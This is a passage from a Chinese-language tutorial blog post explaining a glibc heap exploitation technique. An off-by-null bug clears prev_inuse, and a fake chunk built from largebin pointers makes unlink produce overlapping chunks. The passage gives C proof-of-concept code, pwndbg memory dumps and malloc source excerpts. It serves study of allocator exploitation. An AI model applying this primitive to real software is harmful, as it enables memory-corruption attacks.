class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, victim2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"off-by-null into the size of vicim"</span>);</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	((char *)victim2)[-8] = '\x00';</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Now if we free victim, libc will think the fake chunk is a free chunk above victim\n"</span></span><br><span class="line">			<span class="string">"It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n"</span></span><br><span class="line">			<span class="string">"add the merged chunk into unsortedbin."</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"For our fake chunk, because of what we did in step4,\n"</span></span><br><span class="line">			<span class="string">"now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n"</span></span><br><span class="line">			<span class="string">"so the unlink will succeed\n"</span>, ((<span class="keyword">void</span> **)a3)[<span class="number">1</span>], prev, ((<span class="keyword">void</span> **)b2)[<span class="number">0</span>], prev);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"After freeing the victim, the new merged chunk is added to unsorted bin"</span></span><br><span class="line">			<span class="string">"And it is overlapped with the prev chunk"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step7: validate the chunk overlapping</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Now let's validate the chunk overlapping"</span>);</span><br><span class="line">	<span class="keyword">void</span> *merged = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"merged: malloc(0x100) = %p\n"</span>, merged);</span><br><span class="line">	<span class="built_in">memset</span>(merged, <span class="string">'A'</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now merged's content: %s\n"</span>, (<span class="keyword">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Overwrite prev's content"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prev2, <span class="string">'C'</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"merged's content has changed to: %s\n"</span>, (<span class="keyword">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(merged, <span class="string">"CCCCCCCCC"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">	<span class="keyword">void</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x10000</span> - ((<span class="keyword">long</span>)tmp&amp;<span class="number">0xffff</span>) - tmp[<span class="number">-1</span>]);</span><br><span class="line">	<span class="keyword">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="keyword">char</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(prev);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// b --&gt; prev --&gt; a in largebin</span></span><br><span class="line">    <span class="keyword">long</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">//cash prev out </span></span><br><span class="line">	prev2[<span class="number">1</span>] = <span class="number">0x501</span>;  <span class="comment">//fake size,here must long type</span></span><br><span class="line">	prev2[<span class="number">0x500</span>/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)] = <span class="number">0x500</span>;</span><br><span class="line">	<span class="keyword">short</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>); <span class="comment">// cash b out</span></span><br><span class="line">	b2[<span class="number">0</span>] = <span class="number">16</span>; <span class="comment">//change fd</span></span><br><span class="line">	<span class="keyword">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);  <span class="comment">// cash a out</span></span><br><span class="line">	<span class="built_in">free</span>(a2);     <span class="comment">// into unsorted bin</span></span><br><span class="line">	<span class="built_in">free</span>(victim); <span class="comment">// into unsorted bin</span></span><br><span class="line">	<span class="keyword">short</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>); <span class="comment">//make a3's bk not pointing to bin(now to victim)</span></span><br><span class="line">	a3[<span class="number">4</span>] = <span class="number">16</span>; <span class="comment">// so just need to change the last 2 bytes of a3's bk</span></span><br><span class="line">    <span class="keyword">char</span> *victim2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>); <span class="comment">//cash out from unsorted bin</span></span><br><span class="line">	victim2[<span class="number">-8</span>] = <span class="number">0</span>;  <span class="comment">// use VULNERABILITY  clear prev_inuse bit</span></span><br><span class="line">	<span class="comment">// backward consolidate, use prev2's fd_nextsize and bk_nextsize to fake fd and bk</span></span><br><span class="line">	<span class="built_in">free</span>(victim2);</span><br><span class="line">	<span class="keyword">long</span> *merged = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	assert((<span class="keyword">long</span>)merged - (<span class="keyword">long</span>)prev2 == <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-8"><a href="#pwndbg调试-8" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>程序看着复杂但过程并不复杂。<br>首先申请了四块内存。由于这个技术只修改最多两个字节，所以 tmp 和 pad 这两个 chunk 用于使再申请的 chunk 地址对齐到后面字节相同，也就是下面这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p tmp</span><br><span class="line">$1 = (long *) 0x5555557572a0</span><br><span class="line">pwndbg&gt; p/x tmp[-1]</span><br><span class="line">$3 = 0x21</span><br><span class="line">pwndbg&gt; p/x (long)tmp&amp;0xffff</span><br><span class="line">$4 = 0x72a0</span><br><span class="line">pwndbg&gt; n</span><br><span class="line">pwndbg&gt; p prev</span><br><span class="line">$5 = (void *) 0x555555760010</span><br></pre></td></tr></table></figure></p>
<p>再次申请的 prev 这个 chunk 的地址就从0x55555576xxxx开始，以后再申请的地址后面两字节相同。<br>prev 这个 chunk 用于和 victim 在后面free的时候合并。<br>再申请a 和 b 两个 chunk，这两个用来绕过对unlink prev 的 fd 和 bk 指针的检测。malloc 的三个0x10大小的 chunk 用来防止合并。<br>然后释放chunk_a、chunk_b和chunk_prev，再申请一个比他们仨都大的 chunk，就会把chunk_a、chunk_b和chunk_prev按大小链入large bin，顺序是b-&gt;prev-&gt;a。这样就排好了nextsize链表。查看一下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p a</span><br><span class="line"><span class="meta">$</span>6 = (void *) 0x555555760a40</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p b</span><br><span class="line"><span class="meta">$</span>7 = (void *) 0x555555760f60</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p prev</span><br><span class="line"><span class="meta">$</span>8 = (void *) 0x555555760010</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760000(prev)</span><br><span class="line">0x555555760000: 0x0000000000000000      0x0000000000000511</span><br><span class="line">0x555555760010: 0x0000555555760a30      0x0000555555760f50</span><br><span class="line">0x555555760020: 0x0000555555760a30      0x0000555555760f50</span><br><span class="line">0x555555760030: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760f50</span><br><span class="line">0x555555760f50: 0x0000000000000000      0x0000000000000521</span><br><span class="line">0x555555760f60: 0x0000555555760000      0x00007ffff7dbf0f0</span><br><span class="line">0x555555760f70: 0x0000555555760000      0x0000555555760a30</span><br><span class="line">0x555555760f80: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760a30</span><br><span class="line">0x555555760a30: 0x0000000000000000      0x0000000000000501</span><br><span class="line">0x555555760a40: 0x00007ffff7dbf0f0      0x0000555555760000</span><br><span class="line">0x555555760a50: 0x0000555555760f50      0x0000555555760000</span><br><span class="line">0x555555760a60: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757000</span><br><span class="line">Size: 0x291</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757290</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557572b0</span><br><span class="line">Size: 0x8d51</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555760000</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x555555760a30</span><br><span class="line">bk: 0x555555760f50</span><br><span class="line">fd_nextsize: 0x555555760a30</span><br><span class="line">bk_nextsize: 0x555555760f50</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555760510</span><br><span class="line">Size: 0x500</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555760a10</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555760a30</span><br><span class="line">Size: 0x501</span><br><span class="line">fd: 0x7ffff7dbf0f0</span><br><span class="line">bk: 0x555555760000</span><br><span class="line">fd_nextsize: 0x555555760f50</span><br><span class="line">bk_nextsize: 0x555555760000</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555760f30</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555760f50</span><br><span class="line">Size: 0x521</span><br><span class="line">fd: 0x555555760000</span><br><span class="line">bk: 0x7ffff7dbf0f0</span><br><span class="line">fd_nextsize: 0x555555760000</span><br><span class="line">bk_nextsize: 0x555555760a30</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555761470</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555761490</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557624a0</span><br><span class="line">Size: 0x15b61</span><br></pre></td></tr></table></figure></p>
<p>待会儿会把prev的fd_nextsize作为fd指针，bk_nextsize作为bk指针，这个后面再说。所以，chunk_a是FD，chunk_b是BK，这样FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P这个检测暂时准备好了（因为一会儿要改动一小下）。</p>
<p>现在取出prev（取个新名prev2但是地址还是那个地址）。在原 chunk_prev 内伪造一个 fake_chunk，原prev 大小是0x510，伪造的fake_chunk大小是0x500。然后为了绕过unlink的时候chunk size是否等于next chunk的prev_size的检查，把物理相邻的下一个chunk的prev_size也一起改掉。<br>修改之后：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p prev2</span><br><span class="line"><span class="meta">$</span>9 = (long *) 0x555555760010</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760000</span><br><span class="line">0x555555760000: 0x0000000000000000      0x0000000000000511</span><br><span class="line">0x555555760010: 0x0000555555760a30      0x0000000000000501(fake_chunk size)</span><br><span class="line">0x555555760020: 0x0000555555760a30      0x0000555555760f50</span><br><span class="line">0x555555760030: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">#</span> 原prev的fd_nextsize作为fake_chunk的fd，原prev的bk_nextsize作为fake_chunk的bk。</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p 0x500/sizeof(long)</span><br><span class="line"><span class="meta">$</span>10 = 160</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x &amp;prev2[0x500/sizeof(long)]</span><br><span class="line"><span class="meta">$</span>11 = 0x555555760510</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p victim</span><br><span class="line"><span class="meta">$</span>12 = 0x555555760520</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760510</span><br><span class="line">0x555555760510: 0x0000000000000500      0x0000000000000501</span><br><span class="line">0x555555760520: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555760530: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555760540: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>取出我们的 chunk_b 。因为prev变成prev-0x18了，所以 chunk_b的fd指针也要跟着变化。<br>这里有个小点要注意一下，再次申请的 chunk_b2 的类型是<code>short*</code>。short的宽度为2 byte，所以<code>b2[0] = 16;</code>这里只修改了<code>0f60</code>这两个字节的数据为<code>0010</code>。<br>观察一下这个简化POC，里面申请了不同类型的 chunk，有<code>long*</code>、<code>void*</code>、<code>short*</code>。。这涉及的是计算的时候字节数的问题，不懂得同学可以复习一下指针的运算。<br>修改之后：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p b2</span><br><span class="line"><span class="meta">$</span>13 = (short *) 0x555555760f60</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760f50</span><br><span class="line">0x555555760f50: 0x0000000000000000      0x0000000000000521</span><br><span class="line">0x555555760f60: 0x0000555555760a30      0x00007ffff7dbf0f0</span><br><span class="line">0x555555760f70: 0x0000555555760a30      0x0000555555760a30</span><br><span class="line">0x555555760f80: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760f50</span><br><span class="line">0x555555760f50: 0x0000000000000000      0x0000000000000521</span><br><span class="line">0x555555760f60: 0x0000555555760010      0x00007ffff7dbf0f0</span><br><span class="line">0x555555760f70: 0x0000555555760a30      0x0000555555760a30</span><br><span class="line">0x555555760f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>取出 chunk_b 后，chunk_a 的 fd 和 bk 指针都指向了 large bin 的表头地址，所以我们再让chunk_a和victim一起释放一次，chunk_a 的 bk 指针就会指向 victim，而 victim 的地址只有最后两个字节与 prev 不同，这样还是只需要修改最低两个字节即可。<br>再把 victim 取出来，改一下 prev_inuse 位来绕过 unlink 检查。由于申请的类型是<code>char*</code>类型，修改<code>victim2[-8]</code>就是修改这个地址内容的最后1个字节。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p victim2</span><br><span class="line"><span class="meta">$</span>18 = 0x555555760520</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p &amp;victim2[-8]</span><br><span class="line"><span class="meta">$</span>19 = 0x555555760518</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760510</span><br><span class="line">0x555555760510: 0x0000000000000500      0x0000000000000501</span><br><span class="line">0x555555760520: 0x00007ffff7dbecc0      0x00007ffff7dbecc0</span><br><span class="line">0x555555760530: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555760540: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555760510</span><br><span class="line">0x555555760510: 0x0000000000000500      0x0000000000000500</span><br><span class="line">0x555555760520: 0x00007ffff7dbecc0      0x00007ffff7dbecc0</span><br><span class="line">0x555555760530: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555760540: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>最后<code>free(victim2)</code>的时候，就会引起 unlink 合并<code>prev</code>。<br>再申请一个小于它的 chunk，就会切割这个合并 chunk，引起overlap。<br>过程如下，顺便复习一下 malloc 的过程：<br>先从size 对应的  small bin 中搜索恰好合适大小的chunk，没有的话去遍历 unsorted bin 搜寻恰好大小的 size，再把遍历过的chunk 放入对应的 bin。这里有一种特殊情况，就是在遍历 unsorted bin的时候，如果需要分配一个 small bin chunk，并且 unsorted bin 中只有一个chunk，并且这个 chunk还是last reminder，那么就切割这个last reminder。显然这个poc我们不符合这个条件。<br>这个过程结束后，我们的合并 chunk 就会进入large bin 中。<br>unsorted bin 中也没有的话，就从比它大的 bin 中寻找并切割。就找到了large bin中的合并chunk，然后切割达成overlap。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">(with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">	<span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">			<span class="keyword">goto</span> use_top;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">		bit = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">	<span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		bin = next_bin (bin);</span><br><span class="line">		bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">		assert (bit != <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">	victim = last (bin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">	<span class="keyword">if</span> (victim == bin)</span><br><span class="line">	&#123;</span><br><span class="line">		av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">		bin = next_bin (bin);</span><br><span class="line">		bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">		assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">		remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* unlink */</span></span><br><span class="line">		unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Exhaust */</span></span><br><span class="line">		<span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">		&#123;</span><br><span class="line">			set_inuse_bit_at_offset (victim, size);</span><br><span class="line">			<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">				set_non_main_arena (victim);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Split */</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">			have to perform a complete insert here.  */</span></span><br><span class="line">			bck = unsorted_chunks (av);</span><br><span class="line">			fwd = bck-&gt;fd;</span><br><span class="line">			<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">				malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 2"</span>);</span><br><span class="line">			remainder-&gt;bk = bck;</span><br><span class="line">			remainder-&gt;fd = fwd;</span><br><span class="line">			bck-&gt;fd = remainder;</span><br><span class="line">			fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* advertise as last remainder */</span></span><br><span class="line">			<span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">				av-&gt;last_remainder = remainder;</span><br><span class="line">			<span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">			&#123;</span><br><span class="line">				remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">				remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			set_head (victim, nb | PREV_INUSE |</span><br><span class="line">			(av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">			set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">			set_foot (remainder, remainder_size);</span><br><span class="line">		&#125;</span><br><span class="line">		check_malloced_chunk (av, victim, 